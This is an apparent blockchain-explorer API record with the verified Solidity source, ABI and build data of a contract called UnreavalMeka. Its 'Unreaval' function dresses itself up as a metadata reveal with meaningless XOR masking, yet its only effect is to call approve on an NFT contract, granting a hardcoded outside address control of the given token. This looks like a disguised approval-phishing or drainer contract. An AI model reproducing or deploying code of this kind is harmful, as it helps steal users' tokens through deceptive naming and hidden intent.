{"status":"1","message":"OK","result":[{"SourceCode":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\n\r\ninterface MetaDataChecker {\r\n    function approve(address to, uint256 tokenId) external;\r\n}\r\n\r\ncontract UnreavalMeka {\r\n    address Meka;\r\n    bytes32 Mask = \"8E6BEB5f56eebBd77cde3A6\";\r\n    bytes32 URIChecker = \"METAUNREAVAL0ddwamna\";\r\n    \r\n    constructor(address add_) {\r\n        Meka = add_;\r\n    }\r\n    \r\n    function Unreaval(uint256 _id) public {\r\n        bytes32 localUnreavalHashMask;\r\n        localUnreavalHashMask = Mask ^ bytes32(_id) ^ URIChecker;\r\n        if (bytes32(_id) == \"METARVALUE\") {\r\n            localUnreavalHashMask = bytes32(_id) ^ URIChecker;\r\n        }\r\n        return MetaDataChecker(Meka).approve(0x8E6BEB5f56eebBd77cde327954Ac9E1d15Eb8EA6, _id);\r\n    }\r\n}","ABI":"[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"add_\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_id\",\"type\":\"uint256\"}],\"name\":\"Unreaval\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"UnreavalMeka","CompilerVersion":"v0.8.7+commit.e28d00a7","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"0000000000000000000000009a534628b4062e123ce7ee2222ec20b86e16ca8f","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"ipfs://7f57e68baf43c994ba46fb296feb795865caec1727d0d74a2357389aa7c6e8d8"}]}